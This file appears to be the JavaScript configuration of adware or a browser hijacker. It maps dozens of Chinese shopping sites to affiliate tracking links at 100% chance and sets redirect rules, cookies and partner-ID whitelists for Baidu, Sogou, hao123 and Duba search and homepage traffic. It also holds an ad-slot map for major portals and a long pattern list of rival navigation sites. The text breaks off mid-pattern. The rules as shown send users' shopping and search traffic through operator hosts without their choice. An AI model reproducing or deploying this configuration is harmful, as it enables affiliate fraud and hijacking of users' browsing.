    
var ChannelIdjy=1200004;
var Config = {
    cpshost: "http://www.98fanli.com",
    searchhost: "http://www.tfss123.com",
    haulBackhost:"http://www.tfdhbf123.com",
    protecthost: "http://www.tfdhbf123.com",
    tmallhost: "http://www.tfdhbf123.com",
    channel: 1200004,
    Bundles: {
        cps: {
            "banggo.com": {
               transit: "/c/"+ ChannelIdjy +"/banggo",
               matchs: [ 
                   "www.banggo.com/goods/",
                   "www.banggo.com/theme/"
               ],
               indexof: ['#'],
               chance:"100%"
             },
            "vancl.com": {
                transit: "/c/"+ ChannelIdjy +"/vancl",
                matchs: [ "item.vancl.com" ],
                indexof: [
                    '#', '#testFloat1', '#testFloat2', '#testFloat3', '#testFloat4', '#testFloat5',
                    '#anchorPinglun', '#anchorQuiz', '#anchor1', '#1', '#quiz', '#ProductTitleHide',
                    '#mtzs', '#cpzs', '#cpcm', '#xdby'
                ],
                chance:"100%"
            },
            "jd.com": {
                transit: "/c/"+ ChannelIdjy +"/jd",
                matchs: [ "item.jd.com" ],
                indexof: ['#comment', '#product-detail', '#none', '#try-report', '#'],
                chance:"100%"
            },
            "vip.com": {
                transit: "/c/"+ ChannelIdjy +"/vip",
                matchs: [ "www.vip.com/detail-" ],
                indexof: ['###', '#', '#top'],
                chance:"100%"
            },
            "suning.com": {
                transit: "/c/"+ ChannelIdjy +"/suning",
                matchs: [
                    "www.suning.(?:com|cn)/emall/(Prod|prd|cprd)",
                    "www.suning.(?:com|cn)/webapp/wcs/stores/servlet/(Prod|prd)",
                    "product.suning.com/?[^/]*",
                    "item.suning.com.*",
                    "snbook.suning.(?:com|cn)/web/(Prod|prd)"
                ],
                indexof: ['#', '###', '#pro_detail_tab'],
                chance:"100%"
            },
            "dangdang.com": {
                transit: "/c/"+ ChannelIdjy +"/dangdang",
                matchs: [ "product.dangdang.com" ],
                indexof: ['#review_point', 'picture', '#filtertype'],
                chance:"100%"
            },
            "yhd.com": {
                transit: "/c/"+ ChannelIdjy +"/yhd",
                matchs: [ "item.yhd.com/item","s.yhd.com/item/" ,"t.yhd.com/detail/"],
                indexof: ['#productExperience', '#desc_sppj'],
                chance:"100%"
            },

            "jumei(global)?.com": {
                transit: "/c/"+ ChannelIdjy +"/jumei",
                matchs: [
                    "koubei.jumei.com/product",
                    "pop.jumei.com/i/deal.*",
                    "www.jumei.com/i/deal.*",
                    "mall.jumei.com/.+/product.*",
                    "item.jumei.com/.+",
                    "item.jumeiglobal.com/.+"
                ],
                indexof: ['#report_deal_show', 
                    '#product_parameter', 
                    '#', '#spxx', '#spxq', 
                    '#spsp', '#cjwt',
                    '#product_story', '#real_photo', 
                    '#report_deal_show', '#product_promise'
                ],
                chance:"100%"
            },

            "gome.com": {
                transit: "/c/"+ ChannelIdjy +"/gome",
                matchs: [
                    "www.gome.com.cn/.*product/",
                    "item.gome.com.cn/.*",
                    "www.gome.com.cn/.*itemdetail/",
                    "tao.gome.com.cn/p.*"
                ],
                indexof: ['bigimage', '?intcmp'],
                chance:"100%"
            },
            "meilishuo.com": {
                transit: "/c/"+ ChannelIdjy +"/meilishuo",
                matchs: [ "www.meilishuo.com/share/item" ],
                indexof: ['#'],
                chance:"100%"
            },
            "vmall.com": {
                transit: "/c/"+ ChannelIdjy +"/vmall",
                matchs: [ "www.vmall.com/product.*" ],
                indexof: ['#', '#pro-tab-evaluate', '#inquire-form'],
                chance:"100%"
            },
             "ly.com": {
                transit: "/c/"+ ChannelIdjy +"/ly",
                matchs: [
                    "www.ly.com/(dujia/tours/)|(youlun/tours-)",
                    "gny.ly.com/guoneiyou/tours/d+",
                    "gny.ly.com/line/.*",
                    "www.ly.com/HotelInfo-"
                ],
                indexof: ['#Day', '#'],
                chance:"100%"
            }, 
            "ehaier.com": {
                transit: "/c/"+ ChannelIdjy +"/ehaier",
                matchs: [ "www.ehaier.com/product" ],
                indexof: [],
                chance:"100%"
            },
            "wbiao.cn": {
                transit: "/c/"+ ChannelIdjy +"/wbiao",
                matchs: [ "www[.]wbiao[.]cn/[a-zA-Z0-9-]+[.]html" ],
                indexof: ['#thick', '#', '#psize'],
                chance:"100%"
            },
            "lifevc.com": {
                transit: "/c/"+ ChannelIdjy +"/lifevc",
                matchs: [ "www.lifevc.com/item" ],
                indexof: ['#'],
                chance:"100%"
            },
            "yougou.com": {
                transit: "/c/"+ ChannelIdjy +"/yougou",
                matchs: [ "www[.]yougou[.]com/c-[0-9A-Za-z-/]+[.]shtml" ],
                indexof: [],
                chance:"100%"
            },
            "jiuxian.com": {
                transit: "/c/"+ ChannelIdjy +"/jiuxian",
                matchs: [ "www.jiuxian.com/goods-[d]+.html" ],
                indexof: [],
                chance:"100%"
            },
            "111.com": {
                transit: "/c/"+ ChannelIdjy +"/111",
                matchs: [ "www.111.com.cn/product" ],
                indexof: ['#itemComments', '#']
            },
            "moonbasa.com": {
                transit: "/c/"+ ChannelIdjy +"/moonbasa",
                matchs: [
                    "(lingerie|fashion|shoes|lady).moonbasa.com/.*",
                    "item.moonbasa.com/.*"
                ],
                indexof: ['#item_d_nav', '#'],
                chance:"100%"
            },
            "womai.com": {
                transit: "/c/"+ ChannelIdjy +"/womai",
                matchs: [
                    ".*.womai.com/Product.*",
                    "tuan.womai.com/tuan/product.*",
                    "jiu.womai.com/Wine/Product/Product.*",
                    "www.womai.com/shan/product.*"
                ],
                indexof: ['#', '#sortRemark'],
                chance:"100%"
            },
            "qunar.com": {
                transit: "/c/"+ ChannelIdjy +"/qunar",
                matchs: [
                    "[a-z 0-9]+[.]package.qunar.com/user/id=",
                    "[a-z 0-9]+[.]qunar.com/ticket/detail_",
                    "[a-z 0-9]+[.]package.qunar.com/user/detail.jsp",
                    "[a-z 0-9]+[.]piao.qunar.com/shop/detail",
                    "[a-z 0-9]+[.]qunar[.]com/city/[a-z]+/dt[-][0-9]+/",
                    "[a-z 0-9]+[.]dujia[.]qunar[.]com/fhx/detail/[0-9]+[_]",
                    "[a-z 0-9]+[.]dujia[.]qunar[.]com/pi/detail/[0-9]+[_]"
                ],
                indexof: ['#js_route', '#js_payment', '#js_product_detail', '#js_notes', '#js_qa_wrapper', '#js_book_bottom', '#js_advice'],
                chance:"100%"
            },
            "yintai.com": {
                transit: "/c/"+ ChannelIdjy +"/yintai",
                matchs: [
                    "item.yintai.com/[0-9A-Za-z-]+[.]html"
                ],
                indexof: ['#'],
                chance:"100%"
            },
            "jianke.com": {
                transit: "/c/"+ ChannelIdjy +"/jianke",
                matchs: [
                    "www.jianke.com/product/"
                ],
                indexof: [],
                chance:"100%"
            },
            "masamaso.com": {
                transit: "/c/"+ ChannelIdjy +"/masamaso",
                matchs: [
                    "www.masamaso.com/goods*"
                ],
                indexof: [],
                chance:"100%"
            },
            "okhqb.com": {
                transit: "/c/"+ ChannelIdjy +"/okhqb",
                matchs: [
                    "www.okhqb.com/(?:item|qiang)/w+"
                ],
                indexof: [],
                chance:"100%"
            },
            "228.com": {
                transit: "/c/"+ ChannelIdjy +"/228",
                matchs: [
                    "www.228.com.cn/ticket-d+.html"
                ],
                indexof: ['#', '#pbigimg'],
                chance:"100%"
            },
            "happigo.com": {
                transit: "/c/"+ ChannelIdjy +"/happigo",
                matchs: [
                    "mall.happigo.com/index.php?act=show_groupbuy&op=groupbuy_detail&group_id=",
                    "www.happigo.com/w+/w+/w+/d+.html"
                ],
                indexof: [],
                chance:"100%"
            },
            "yougou.com": {
                transit: "/c/"+ ChannelIdjy +"/yougou",
                matchs: [
                    "www.yougou.com/c-[0-9A-Za-z-/]+.shtml"
                ],
                indexof: ['-viewpic', '#goods_lc', '#goodsBar1', '#'],
                chance:"100%"
            },
            "mia.com": {
                transit: "/c/"+ ChannelIdjy +"/mia",
                matchs: ["www.mia.com/item"],
                indexof: [],
                chance:"100%"
            },
           "zazhipu.com": {
                transit: "/c/"+ ChannelIdjy +"/zazhipu",
                matchs: ["item.zazhipu.com"],
                indexof: ['#'],
                chance:"100%"
            },
            "360kad.com": {
                transit: "/c/"+ ChannelIdjy +"/360kad",
                matchs: ["www.360kad.com/product"],
                indexof: ['#'],
                chance:"100%"
            },
            "yohobuy.com": {
                transit: "/c/"+ ChannelIdjy +"/yohobuy",
                matchs: ["[^w]+\.yohobuy.com/"],
                indexof: ['#'],
                chance:"100%"
            },
            "shopbop.com": {
                transit: "/c/"+ ChannelIdjy +"/shopbop",
                matchs: ["cn.shopbop.com"],
                indexof:['#'],
                chance:"100%"
            },
            "mogujie.com": {
                transit: "/c/"+ ChannelIdjy +"/mogujie",
                matchs: ["shop.mogujie.com/detail/"],
                indexof:['#'],
                chance:"100%"
            } ,
            "zhe800.com": {
                transit: "/c/"+ ChannelIdjy +"/zhe800",
                matchs: ["out.zhe800.com/ju/deal/"],
                indexof:['#'],
                chance:"100%"
            },
            "kaola.com": {
                transit: "/c/"+ ChannelIdjy +"/kaola",
                matchs: ["www.kaola.com/product"],
                indexof:['#'],
                chance:"100%"
            },
            "shopin.net": {
                transit: "/c/"+ ChannelIdjy +"/shopin",
                matchs: ["www.shopin.net/product"],
                indexof: ['#'],
                chance:"100%"
            },
             "feiniu.com": {
                transit: "/c/"+ ChannelIdjy +"/ifeiniu",
                matchs: ["item.feiniu.com"],
                indexof: ['#'],
                chance:"100%"
            },
            "you.163.com": {
                transit: "/c/"+ ChannelIdjy +"/you163",
                matchs: ["you.163.com/item/detail"],
                indexof: ['#'],
                chance:"100%"
            },
            "cn.feelunique.com": {
                transit: "/c/"+ ChannelIdjy +"/feelunique",
                matchs: ["cn.feelunique.com/d+.html"],
                indexof: ['#'],
                chance:"100%"
            },
            "www.mayi.com": {
                transit: "/c/"+ ChannelIdjy +"/mayi",
                matchs: ["www.mayi.com/room/d+"],
                indexof: ['#'],
                chance:"100%"
            } 
        },
        cpsUrl:{
            'banggo':'http://c.duomai.com/track.php?site_id=198042&aid=145&euid=&t=',
            'vancl':'http://c.duomai.com/track.php?site_id=198042&aid=62&euid=&t=',
            'jd':'https://c.duomai.com/track.php?site_id=198042&aid=61&euid=&t=',
            'vip':'http://c.duomai.com/track.php?k=0ZSPklWdlZCO2ETPklWYmIDNwgTOx0DZp9VZ0l2cmYiRyUSbvNmLwlmduc3d3ZkMlYkMlE0MlAHd0hWP&t=',
            'suning':'http://c.duomai.com/track.php?k=Ha9QnJ9QWa1VmJ0gTPklWYmIDNwgTOx0DZp9VZ0l2cmYiJGJTJt92Yucmbp5Wdz5yd3dnRyUiRyUSQzUCc0R&t=',
            'dangdang':'http://p.yiqifa.com/n?k=MOxlDsXKrI6HWNKerI6H2mLErI6HWEDmrnzl6EjS1ZLOWEUH2mqerI6H1Nb815Kl156H2L--&t=',
            'yhd':'http://c.duomai.com/track.php?site_id=198042&aid=58&euid=&t=',
            'jumei':'http://c.duomai.com/track.php?site_id=198042&aid=97&euid=&t=',
            'gome':'http://c.duomai.com/track.php?site_id=198042&aid=236&euid=&t=',
            'nuomi':'http://c.duomai.com/track.php?site_id=198042&aid=399&euid=&t=',
            'meilishuo':'http://c.duomai.com/track.php?site_id=188244&aid=720&euid=&t=',
            'vmall':'http://c.duomai.com/track.php?site_id=198042&aid=387&euid=&t=',
            'ly':'http://c.duomai.com/track.php?site_id=198042&aid=459&euid=&t=',
            'ehaier':'http://c.duomai.com/track.php?site_id=198042&aid=561&euid=&t=',
            'wbiao':'http://c.duomai.com/track.php?site_id=198042&aid=129&euid=&t=',
            'lifevc':'http://c.duomai.com/track.php?site_id=198042&aid=536&euid=&t=',
            'yougou':'http://c.duomai.com/track.php?site_id=198042&aid=366&euid=&t=',
            'jiuxian':'http://c.duomai.com/track.php?site_id=198042&aid=163&euid=&t=',
            '111':'http://c.duomai.com/track.php?site_id=198042&aid=256&euid=&t=',
            'lvmama':'http://c.duomai.com/track.php?site_id=198042&aid=352&euid=&t=',
            'moonbasa':'http://c.duomai.com/track.php?site_id=198042&aid=69&euid=&t=',
            'womai':'http://c.duomai.com/track.php?site_id=198042&aid=334&euid=&t=',
            'eoffcn':'http://p.yiqifa.com/n?k=5Ks7YtU8rI6H6n2LWE6H2mLErI6H2mLq6l3l6ZLFWl3LWEbH6nwqWlRmrI6HkQLErJtFMngEMn2qrIW-&e=c&t=',
            'lenovo':'http://p.yiqifa.com/n?k=2mLErn2l6NjSrI6H2mLErI6H6EReWZLFWl3LWEbHWEWF6NwSrI6HkQLErn2L6927M5Kmrt4B594LpZL-&e=c&t=',
            'lecake':'http://c.duomai.com/track.php?site_id=198042&aid=540&euid=&t=',
            'qunar':'http://c.duomai.com/track.php?site_id=198042&aid=552&euid=&t=',
            'zhubiaoju':'http://p.yiqifa.com/n?k=2mLErnDS6EzlrI6H2mLErI6HWNzL6EBH1nWOWn2FrnKlWEzSWcLErZyH2mLq35KsW5KOWQqNYJUJRNgH&e=c&t=',
            'mcake':'http://c.duomai.com/track.php?site_id=198042&aid=747&euid=&t=',
            'beibei':'http://c.duomai.com/track.php?site_id=198042&aid=861&euid=&t=',
            '818':'http://c.duomai.com/track.php?site_id=198042&aid=185&euid=&t=',
            'shishangqiyi':'http://c.duomai.com/track.php?site_id=198042&aid=2409&euid=&t=',
            'yintai':'http://c.duomai.com/track.php?site_id=198042&aid=70&euid=&t=',
            'microsoftstore':'http://p.yiqifa.com/n?k=2mLErnDS1NWerI6H2mLErJyKKN4SkQLq6lRSWcLFWl3LWEbH6Njl6EjqrI6HkQLErJMb6NBbMJWsrIW-&e=c&t=',
            'mei':'http://c.duomai.com/track.php?site_id=198042&aid=1767&euid=&t=',
            '800pharm':'http://p.yiqifa.com/n?k=2mLErntL1NzSrI6H2mLErnDFpOomMQLsWERLrnzl6EjS1ZLO6lWlWcLErZyH2mqb39PyMEWFMQLE&e=c&t=',
            'jianke':'http://p.yiqifa.com/n?k=2mLErn2mWNDSrI6H2mLErI6H6ljOWmLFWl3LWEbH6nt76NjLrJocU7sSNcqerI6H6lPEMNjS6nPH2L--&e=c&t=',
            'aoyou':'http://p.yiqifa.com/n?k=2mLErn276E3SrI6H2mLErI6H6Eze1QLFWl3LWEbHWltq6lzOrI6HkQLErntF6NWO6Ey8rJeXPPRS3cL-&e=c&t=',
            'txjp':'http://p.yiqifa.com/n?k=2mLErn27Wl3SrI6H2mLErnU4RmAbkZLO1nK7rnzl6EjS1ZLS1nDe6n6H2mqerI6HMnKO6JDlWlgH2L--&e=c&t=',
            'ikang':'http://p.yiqifa.com/n?k=2mLErn271n3SrI6H2mLErI6H6Eze6cLFWl3LWEbHWljeWEjFrI6HkQLErJgyMEByWOKsrtBwMsjLNmL-&e=c&t=',
            'hotels':'http://p.yiqifa.com/n?k=CwPSUmMfrI6H6n2S6lgH2mLErI6H2mLq6lDS6cLFWl3LWEbH6nKO6n2lrI6HkQLErJWqWNwm3EKlrIW-&e=c&t=',
            'masamaso':'http://c.duomai.com/track.php?site_id=198042&aid=75&euid=&t=',
            'okhqb':'http://p.yiqifa.com/n?k=2mLErn276E3lrI6H2mLErI6H6EDe6ZLFWl3LWEbHWNtF6ntSrI6HkQLErnyy6NtqMJ2qrBAxUnPlgQL-&e=c&t=',
            'shoprobam':'http://p.yiqifa.com/n?k=KyUEYO7lrI6H6n2s1n4H2mLErI6H2mLq6lwSWmLFWl3LWEbH6N276EWqrI6HkQLErJgEWlRm1NterIW-&e=c&t=',
            'epet':'http://c.duomai.com/track.php?site_id=198042&aid=1722&euid=&t=',
            '228':'http://c.duomai.com/track.php?site_id=198042&aid=717&euid=&t=',
            'zhongmian':'http://p.yiqifa.com/n?k=2mLErnDS6l2FrI6H2mLErI6HWNzq6NbH1nWOWn2FrnKl6nKsWZqTYyMFkEBHkQLErJgw39Kl6Nj7rIW-&e=c&t=',
            'km1818':'http://p.yiqifa.com/n?k=39ANCQBmrI6H6n2l6nyH2mLErI6H2mLq6lRO1QLFWl3LWEbH6Nt7WltlrI6HkQLErnDs39KFWlKFrIW-&e=c&t=',
            'wyn88':'http://c.duomai.com/track.php?site_id=198042&aid=774&euid=&t=',
            'happigo':'http://c.duomai.com/track.php?site_id=198042&aid=126&euid=&t=',
            'chunshuitang':'http://p.yiqifa.com/n?k=2mLErnWS6n4H2mLErI6H2mL7Wn3qrnzl6EjS1ZLSWEzl6QLErZyH2mL7MJDm6JDLWmq3CNKqMtMH&e=c&t=',
            'asos':'http://c.duomai.com/track.php?site_id=198042&aid=2520&euid=&t=',
            'ymatou':'http://c.duomai.com/track.php?site_id=198042&aid=1419&euid=&t=',
            'zhongjiu':'http://c.duomai.com/track.php?site_id=198042&aid=630&euid=&t=',
            'hua':'http://p.yiqifa.com/n?k=2mLErnDS6n3OrI6H2mLErI6HWNRF6lgH1nWOWn2Frnt71NDFWQLErZyH2mLlWJDl6NjsWmqeMQggWJBH&e=c&t=',
            'xiu':'http://c.duomai.com/track.php?site_id=198042&aid=181&euid=&t=',
            'mia':'http://c.duomai.com/track.php?site_id=188244&aid=930&euid=&t=',
            'ifeiniu':'https://c.duomai.com/track.php?site_id=198042&aid=735&euid=&t=',
            'zazhipu':'https://c.duomai.com/track.php?site_id=198042&aid=1785&euid=&t=',
            '360kad':'https://c.duomai.com/track.php?site_id=198042&aid=1734&euid=&t=',
            'yohobuy':'https://c.duomai.com/track.php?site_id=198042&aid=1719&euid=&t=',
            'shopbop':'https://c.duomai.com/track.php?site_id=198042&aid=780&euid=&t=',
            'shopin':'https://c.duomai.com/track.php?site_id=198042&aid=90&euid=&t=',
            'kaola':'https://c.duomai.com/track.php?site_id=198042&aid=1737&euid=&t=',
            'mogujie':'https://c.duomai.com/track.php?site_id=198042&aid=621&euid=&t=',
            'zhe800':'https://c.duomai.com/track.php?site_id=198042&aid=1449&euid=&t=',
            'you163':'https://c.duomai.com/track.php?site_id=198042&aid=3087&euid=&t=',
            'feelunique':'https://c.duomai.com/track.php?site_id=198042&aid=3339&euid=&t=',
            'mayi':'https://c.duomai.com/track.php?site_id=198042&aid=477&euid=&t=',
            'elong':'https://c.duomai.com/track.php?site_id=198042&aid=178&euid=&t='
        },
        ad: {
            "www.4399.com": 395346,
            "v.youku.com": 395346,
            "www.letv.com": 395346,
            "tv.sohu.com": 395346,
            "www.tudou.com": 395346,
            "t.qq.com": 395346,
            "sports.sina.com.cn": 395346,
            "news.4399.com": 395346,
            "www.ku6.com": 395346,
            "www.ce.cn": 395346,
            "xyx.hao123.com": 395346,
            "4399.iqiyi.com": 395346,
            "www.youyuan.com": 395346,
            "picture.youth.cn": 395347,
            "news.xinhuanet.com": 395347,
            "www.soku.com": 395347,
            "news.k618.cn": 395347,
            "photo.gmw.cn": 395347,
            "economy.gmw.cn": 395347,
            "sports.qq.com": 395347,
            "cheshi": 395347,
            "news.youth.cn": 395347,
            "www.chinanews.com": 395347,
            "www.docin.com": 395347,
            "news.china.com.cn": 395347,
            "mil.sohu.com": 395347,
            "www.wasu.cn": 395347,
            "vod.kankan.com": 395347,
            "sports.163.com": 395347,
            "www.doc88.com": 395347,
            "www.m1905.com": 395347,
            "www.xxhh.com": 395348,
            "www.baxue.com": 395348,
            "www.3jy.com": 395348,
            "www.jide123.com": 395348,
            "www.junshi.cc": 395348,
            "www.4399dmw.com": 395348,
            "www.gexing.com": 395348,
            "yule.2258.com": 395348,
            "www.tianyi176.com": 395348,
            "www.cxzww.com": 395348,
            "www.211js.com": 395348,
            "bbs.xinjunshi.com": 395348,
            "www.guoman8.com": 395348,
            "www.readnovel.com": 395348,
            "bbs.miercn.com": 395348,
            "www.23us.com": 395348,
            "bbs.qianyan001.com": 395348,
            "www.milnews2.com": 395348,
            "photo.haiwainet.cn": 395348,
            "pic.jrj.com.cn": 395348,
            "www.cnrexue.com": 395348,
            "tuku.military.china.com": 395348,
            "xiao.39yst.com": 395348,
            "www.junqing123.com": 395348,
            "www.23hh.com": 395348,
            "video.baomihua.com": 395348,
            "www.juyouqu.com": 395348,
            "www.mahua.com": 395348,
            "www.top81.com.cn": 395348,
            "www.fxingw.com": 395348,
            "www.66721.com": 395348,
            "www.epzw.com": 395348,
            "www.u8xs.com": 395348,
            "bbs.tiexue.net": 395348,
            "qzone.qq.com": 395349,
            "s.taobao.com": 395350,
            "item.taobao.com": 395350,
            "user.qzone.qq.com": 403575,
            "mail.qq.com": 403575,
            "www.sj88.com": 403575,
            "news.ifeng.com": 403575,
            "car.autohome.com.cn": 403575,
            "www.iqiyi.com": 403575,
            "news.qq.com": 403575,
            "mp.weixin.qq.com": 403575,
            "quote.eastmoney.com": 403575,
            "www.zb8.com": 403575,
            "ent.qq.com": 403575,
            "mail.163.com": 403575,
            "www.58pic.com": 403575,
            "guba.eastmoney.com": 403575,
            "www.autohome.com.cn": 403575,
            "rc.qzone.qq.com": 403575,
            "www.sohu.com": 403575,
            "www.leitingcn.com": 403575,
            "www.biquge.la": 403575,
            "www.bdxyjz.com": 403575,
            "news.sohu.com": 403575,
            "fashion.qq.com": 403575,
            "www.qulishi.com": 403575,
            "www.9yaocn.com": 403575,
            "gu.qq.com": 403575,
            "blog.ifeng.com": 403575,
            "car.bitauto.com": 403575,
            "fund.eastmoney.com": 403575,
            "www.zhibo8.cc": 403575,
            "bbs.tianya.cn": 403575,
            "fashion.ifeng.com": 403575,
            "ent.ifeng.com": 403575,
            "preview.mail.163.com": 403575,
            "www.weather.com.cn": 403575,
            "www.bilibili.com": 403575,
            "s.weibo.com": 403575,
            "mil.news.sina.com.cn": 403575,
            "news.haiwainet.cn": 403575,
            "v.ku6.com": 403575,
            "www.7k7k.com": 403575,
            "news.docer.com": 403575,
            "bbs.qtv.com.cn": 403575,
            "pic.chinadaily.com.cn": 403575, 
            "cpro.baidu.com": 403575

        },
        search: {
            "www.baidu.com": {
                whitelist: /92812351_hao_pg|94667043_hao_pg|98131360_hao_pg|93240584_s_hao_pg|92597692_hao_pg|95041251_s_hao_pg|90435139_hao_pg|94832373_hao_pg|93916617_hao_pg|request_1_pg|25017023_5_pg|94438924_hao_pg|96200556_hao_pg|96467588_hao_pg|98933445_hao_pg|93196050_hao_pg|90698950_hao_pg|90276337_hao_pg|91070185_hao_pg|94438924_hao_pg|97728160_hao_pg|93993029_hao_pg|91070185_hao_pg|93499543_hao_pg|99482684_hao_pg|95645462_hao_pg|94814417_hao_pg|91667396_hao_pg|92719201_hao_pg|94279878_hao_pg|99578545_hao_pg|94525363_hao_pg|93867527_hao_pg|90303930_hao_pg|93453023_hao_pg|93837215_hao_pg|93861259_hao_pg|97140937_hao_pg|97041867_hao_pg|93451485_hao_pg|94773282_hao_pg/,
                param: "/baidu/"+ChannelIdjy,
                target: "/p",
                url: "http://www.tfss123.com",
                refwhitelist: "www.2345.com/?30807|www.2345.com/?30807-0001|www.hao774.com/?37818-0001",
                cookie:{
                    jumpNum:1,
                    name:"bdsearch",
                    cookieTime: 60 ,
                    clears:[ "www.baidu.com" , "baidu.com"]
                },
                status:1
            }
        },
        Jd: {
            "re.jd.com": {
                cpsUrlKey: "jd",
                jdItemHost: "https://item.jd.com/",
                whitelist: /t_36378_859347_/
            }
        },
        vip: {
              "www.vip.com": {
                param: "",
                target: "",
                cookie: "vip",
                url: "https://click.union.vip.com/redirect.php?code=WwfOYBI"
            }, 
            "www.jd.com": {
                param: "",
                target: "",
                cookie:"jd",
                url: "http://www.yiyaowei.com/index.php?mod=jump&act=out&subid=P643VCAB"
            }
        },
        haulBack: {
          "daohang.qq.com":{
                whitelist:"",
                param:"/qq/"+ChannelIdjy,
                target:"/h",
                chance:"7%",
                cookie:{
                    jumpNum:5,
                    name:"qq",
                    cookieTime:60,
                    clears:["daohang.qq.com" , "qq.com"]
                },
                url: "",
                status:0
            }
        },
        protect: {
            "www.duba.com": {
                tn: "un_369374_102",
                whitelist: /un_369374_104|un_369374_103|un_449343_4631|un_369374_101|un_369374_102|un_369374_28|un_369374_24|un_369374_22|un_369374_22|un_369374_23|un_369374_21/,
                param: "/duba/"+ChannelIdjy,
                target: "/p",
                chance:"100%",
                cookie:{
                    jumpNum:5,
                    name:"duba",
                    cookieTime:86400,
                    clears:[ "www.duba.com" , "duba.com"]
                },
                url: "",
                status:1
            },
            "www.sogou.com":{
                whitelist:/sogou-site-37740d59bb0eb7b4/,
                param:"/wsogou/"+ChannelIdjy,
                target:"/p",
                chance:"100%",
                cookie:{
                    jumpNum:5,
                    name:"sogou",
                    cookieTime:60,
                    clears:[ "www.sogou.com" , "sogou.com"]
                },
                url: "",
                status:0
            },
            "www.hao774.com":{
                whitelist:"",
                param:"/hao774/"+ChannelIdjy,
                target:"/p",
                chance:"100%",
                browserVague:"2345Explorer",
                cookie:{
                    jumpNum:2,
                    name:"hao774",
                    cookieTime:60,
                    clears:[ "www.hao774.com" , "hao774.com"]
                },
                url: "",
                status:0
            }
        },
        hao123: {
            "www.hao123.com":{
                whitelist: /94667043_hao_pg|93240584_s_hao_pg|94441531_s_hao_pg|92597692_hao_pg|95041251_s_hao_pg|90435139_hao_pg|91070185_hao_pg|94438924_hao_pg|96200556_hao_pg|96467588_hao_pg|98933445_hao_pg|93196050_hao_pg|90698950_hao_pg|90276337_hao_pg|91070185_hao_pg|94438924_hao_pg|97728160_hao_pg|93993029_hao_pg|91070185_hao_pg|93499543_hao_pg|99482684_hao_pg|95645462_hao_pg|94814417_hao_pg|91667396_hao_pg|92719201_hao_pg|94279878_hao_pg|99578545_hao_pg|94525363_hao_pg|93867527_hao_pg|90303930_hao_pg|93453023_hao_pg|93837215_hao_pg|93861259_hao_pg|97140937_hao_pg|97041867_hao_pg/,
                param:"/hao123/"+ChannelIdjy,
                target:"/p",
                chance:"100%",
                cookie:{
                    jumpNum:5,
                    name:"ha123",
                    cookieTime:86400,
                    clears:["www.hao123.com" , "hao123.com"]
                },
                url: "",
                status:1
            }
        },
        sogou: {
            "web.sogou.com":{
                whitelist: /22149|22164|22270|12494-|12691|12242-0083|11661-0038/,
                param: "/sogou/"+ChannelIdjy,
                target:"/p",
                chance:"100%",
                cookie:{
                    jumpNum:5,
                    name:"websogou",
                    cookieTime:86400,
                    clears:["web.sogou.com" , "sogou.com"]
                },
                url: "",
                status:1
            },
            "123.sogou.com":{
                whitelist: /22149|22164|22270|12494-|12242-0079|12242-0097|12691|12242-0083|11661-0038/,
                param: "/sogou/"+ChannelIdjy,
                target:"/p",
                chance:"100%",
                cookie:{
                    jumpNum:5,
                    name:"123sogou",
                    cookieTime:86400,
                    clears:["123.sogou.com" , "sogou.com"]
                },
                url: "",
                status:1
            }
        },
        essw: {
            vague: "hao(9.downhelper|1.165123|9.zmjph|1.696123|9.xzj15|8.xzj15|1.356123|1.135031|8.downhelper|1.935123|9.xzj56|2.zmjph|9.336036|774|3.zmjph|2.xzj15|8.xzj56|3377|8.336036).com|hao(360.cn|123.cn|5.z8q.cc|123.2547.cc)|hao.(7654|dh440|dh311|826826|165123|dh218|356123|382382|dh012|345ie|135031|135906|135650|201201|696123|135056|dh150|qq|553553|935123|exiaoba|dh533|dh322|qkime|dh225|221199|dh269|dh538|dh331|dh323|dh144|dh622|dh559).com|hao.(337337|335335|sogo123|z8s|339339|z8q|8m3).cc|hao.(861588.net|nnmm.in|rising.cn|rbun.cn)|www.(cn362|999|9973|525dh|cn-2345|037398|jiegeng|265|996v|2345x|114la8|221w|bei5ai|9991|789w|6701|hao8666|wndhw|236569|hao7979|jd933|dh9898|114la9|i1236|a5186|6789|227v|114la|shaqm|ie116|2345ak|356123|hnxinrun|9766|2877|135650|2345lt|haoqq|n502|135906|hao767|hjs668|696123|553553|52daohang|135031|jia345|249980|2345s|wangzhanchi|cbala|382382|155111|jcheng56|yiyipk|xpg022|157167|qqhao123|369|hao7799|lvse|tong58|31992|qnjjt|5646|dh115|a2340|525525|127wz|hxr123|18227|cd115|2588wz|345ie|234le|xuanruixinxi|732732|381381|bao112|236wz|531591|huajiufu|96ie|2345at|cn677|910868|hao881|2345wb|2345tt|dh5656|dh765|xitongxin|135056|260260|hh115|2345jj|525261|660055|hh155|5168110|935123|096608|hao3737|9973t|987|363107|30bz|dx92|236778|65875|jl23|201201|115wz|6538|sogouwe|dn2018|517kt|dh136|hao1816|hao2345|dh5558|255123|ba234|http-123|haozhanba|ip686|32481|2345yu|a878bb).com|www.(hao123|qinjiaoyun|114la|365shouyao|4585|duocpa2|cnboer|23450).cn|www.(166866|csxfw|i1236|50305|9229|885390|hao2015|861588|2345ba).net|www.(341.mg|5566.org|8090.so|1234.cx|3774.am|6789.la)|www.(333|335335|339339).cc|(09h.s.3jdh|10h.s.3jdh|news.duba|360.2588wz|baidu.kugua88|28h.s.3jdh|xumanhy|04h.s.3jdh|13h.s.3jdh|07b.s.3jdh|dh.525525|07d.sg.531dh|09b.s.3jdh|15h.s.3jdh|qq.3199wz|360.889wz|lb.ss998998|ss998998|2345.3199wz|du.3199wz|yeah.qq|09b.s.al456|07b.s.al456|135.583522|04d.sg.531dh|jst.hellohuohu|360.185595|09d.sg.531dh|dh.727123|ie.n502|app.p8yw|img1.ijinshan|321.008048|114.xixik|656a|ie.889wz|p-2345|10d.sg.531dh|123.hao3535|ie.236778|36.889wz|index.icafe66|7nns.sg.531dh|daohang.ezhaoba|07d.b.al456|09d.b.al456|09b.b.al456|07b.b.al456|123.yy|dh.myie9|.lvse|360.127wz|dh219|dh440|360.669wz|123.dh9898|d.sg.531dh|13b.s.al456|2345.hao3603|hengmuwencheng|360.236wz|bd.1998mall|dh.zhekoudaodi|gj.164133|uc.uc404|v.2345daohang|123.kuaiso|uc.185595|dh218|123.960638|360.129wz|123.008048|az.73429|10d.s.3jdh|bd.ss998998|360.hao3535|cn-2345|m.2345|321.065525|daohang.6899).com|(114.112.93.100|h.q1m.cc:7518|42.62.30.180|5566.net|123.59.82.27|gj.885360.net|yangsheng.satis.cc|kingjzb.51.net|bd.337337.cc|baidu.dzsmc.cn|bd.339339.cc|360.dzsmc